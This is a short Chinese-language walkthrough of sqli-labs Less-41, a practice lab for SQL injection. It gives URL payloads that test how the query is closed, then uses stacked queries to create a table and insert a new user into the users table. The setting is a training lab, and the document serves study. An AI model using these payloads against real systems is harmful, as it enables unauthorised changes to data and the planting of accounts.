---
title: Less - 41
date: 2023-03-21T11:20:55Z
lastmod: 2023-03-21T11:37:03Z
---

# Less - 41

---

# 通关教程

---

## 1、判断闭合

---

```http
http://192.168.23.128/sqli-labs/Less-41/?id=1' #无错误回显
http://192.168.23.128/sqli-labs/Less-41/?id=1--+ #回显正常
http://192.168.23.128/sqli-labs/Less-41/?id=1'--+ #回显错误
http://192.168.23.128/sqli-labs/Less-41/?id=1"--+ #回显错误
```

​![image](assets/image-20230321112631-jneanui.png)​

​![image](assets/image-20230321112751-hgj62m9.png)​

---

## 2、创建一张表

---

```http
http://192.168.23.128/sqli-labs/Less-41/?id=1;create table test like users;--+
```

​![image](assets/image-20230321113145-b9ujrsy.png)​

​![image](assets/image-20230321113447-m98m6ou.png)​

---

## 3、创建一个新用户

---

```http
http://192.168.23.128/sqli-labs/Less-41/?id=1;insert into users values(18,'cmx','cmx');--+
```

​![image](assets/image-20230321113642-it31dwg.png)​

​![image](assets/image-20230321113701-7sm3o7l.png)​

‍
